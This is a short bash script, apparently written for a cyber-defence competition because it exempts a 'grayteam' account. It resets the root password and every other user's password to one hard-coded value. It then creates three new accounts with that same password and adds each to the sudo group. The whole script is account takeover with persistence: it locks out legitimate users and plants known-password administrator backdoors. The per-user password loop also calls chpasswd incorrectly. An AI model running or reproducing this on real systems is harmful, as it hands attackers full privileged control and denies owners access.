#!/bin/bash

sudo sh -c 'echo root:ILoveCooking | chpasswd'
users=$(cut -d: -f1 /etc/passwd)

for user in $users; do
if [[ "$user" == "grayteam" ]]; then
echo "Grayteam excluded"
else echo "$user:ILoveCooking" | sudo chpasswd "$user"
fi
done

sudo useradd -p $(openssl passwd -1 ILoveCooking) marco;
sudo useradd -p $(openssl passwd -1 ILoveCooking) gordon;
sudo useradd -p $(openssl passwd -1 ILoveCooking) wolfgang;
sudo usermod -aG sudo marco;
sudo usermod -aG sudo gordon;
sudo usermod -aG sudo wolfgang;
echo done
